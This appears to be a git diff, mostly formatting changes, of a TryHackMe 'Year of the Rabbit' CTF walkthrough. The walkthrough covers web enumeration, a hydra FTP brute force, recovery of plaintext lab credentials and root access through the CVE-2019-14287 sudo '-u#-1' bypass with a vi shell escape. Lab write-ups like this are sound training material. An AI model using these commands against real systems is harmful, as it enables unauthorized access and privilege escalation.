@@ -6,13 +6,12 @@ categories:
   - TryHackMe
 ---
 
-<img src="yotr.jpeg" alt="rabbit" width=200/>
+{{< post-img src="yotr.jpeg" alt="rabbit" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
 
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.2
 
@@ -36,9 +35,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-### ffuf
-
-```
+```bash
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
                         [Status: 200, Size: 7853, Words: 2862, Lines: 190]
@@ -52,32 +49,29 @@ Upon website enumeration we visit `/assets` dir there is a `rickrolled.mp4` vide
 
 and a css file...that we might as well check and oh...
 
-```
+```css
 /* Nice to see someone checking the stylesheets.
      Take a look at the page: /sup3r_s3cr3t_fl4g.php
   */
 ```
 
 People hide things in stylesheets now? wow! who would know?
-
-they recommand to disable javascript? we fire up `burpsuite` instead
-
+they recommend to disable javascript? we fire up `burpsuite` instead
 we see that before redirecting us to a rickroll (that I dodged like a pro )
-
 it does a request with a nice parameter
 
-```
+```text
 GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
 Host: 10.10.27.204
 ```
 
 We just visit the `/WExYY2Cv-qU` dir to get a picture named `Hot_Babe.png`
 
-<img src="Hot_Babe.png" alt="hot-babe" width=200/>
+{{< post-img src="Hot_Babe.png" alt="hot-babe" style="width: 200px;" >}}
 
 I sense steganography
 
-```
+```bash
 └──╼ $exif Hot_Babe.png
 Données corrompues
 Les données fournies ne respectent pas les spécifications.
@@ -96,21 +90,18 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 Yeah indeed...I try `strings` and yes it was that
 
-```
+```text
 Eh, you've earned this. Username for FTP is ftpuser
 One of these is the password:
 ...
 ```
 
 I copy the list in a `dict.txt` file
-
 Now we can either try each password manually like cavemen...or use hydra
-
 I trust ya'll on this to make the best choice
-
 I do it the peasant way
 
-```
+```bash
 └──╼ $hydra -l ftpuser -P dict.txt ftp://10.10.27.204
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -124,12 +115,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 12:34:
 ```
 
 Now we can ftp as `ftpuser : 5iez1wGXKfPKQ`
-
 We get `Eli`'s creds...but in `brainf*ck`
-
 Let me decode that for yo real quick
 
-```
+```bash
 User: eli
 
 Password: DSpDiM1wAEwid
@@ -137,7 +126,7 @@ Password: DSpDiM1wAEwid
 
 We get access
 
-```
+```bash
 └──╼ $ssh eli@10.10.154.151
 The authenticity of host '10.10.154.151 (10.10.154.151)' can't be established.
 ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
@@ -161,7 +150,7 @@ eli@year-of-the-rabbit:~$
 
 nice ambiance...we are at the right place
 
-```
+```bash
 eli@year-of-the-rabbit:/home/gwendoline$ ls
 user.txt
 eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt
@@ -170,7 +159,7 @@ cat: user.txt: Permission denied
 
 I don't know what I expected
 
-```
+```bash
 eli@year-of-the-rabbit:/home/gwendoline$ find / -name "*s3cr3t*" 2> /dev/null
 /var/www/html/sup3r_s3cr3t_fl4g.php
 /usr/games/s3cr3t
@@ -179,7 +168,7 @@ eli@year-of-the-rabbit:/home/gwendoline$
 
 Let's meddle with people's affairs
 
-```
+```bash
 eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -al
 total 12
 drwxr-xr-x 2 root root 4096 Jan 23  2020 .
@@ -194,13 +183,11 @@ Yours sincerely
    -Root
 ```
 
-they say its for her only but let us all have read access
-
+They say its for her only but let us all have read access
 LMAO 60 characters...
-
 now we got access as `gwendoline : MniVCQVhQHUNI`
 
-```
+```bash
 gwendoline@year-of-the-rabbit:~$ cat user.txt
 THM{hmm_what_s_up_doc_?}
 ```
@@ -209,20 +196,17 @@ THM{hmm_what_s_up_doc_?}
 
 The classics
 
-```
+```bash
 gwendoline@year-of-the-rabbit:~$ sudo -l
 Matching Defaults entries for gwendoline on year-of-the-rabbit:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User gwendoline may run the following commands on year-of-the-rabbit:
     (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
-
 ```
 
 hmm...`!root`
-
 hmm...`vi`
-
 I say `cve-2019-14287`
 
 I remember it from a nice tryhackme room dedicated to it so check it [here](https://tryhackme.com/room/sudovulnsbypass)
@@ -230,10 +214,9 @@ I remember it from a nice tryhackme room dedicated to it so check it [here](http
 `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
 
 Now that `vi` is open, use the classic `:!/bin/bash`
-
 (you can visit gfobins for that one)
 
-```
+```bash
 root@year-of-the-rabbit:/home/gwendoline# id
 uid=0(root) gid=0(root) groups=0(root)
 
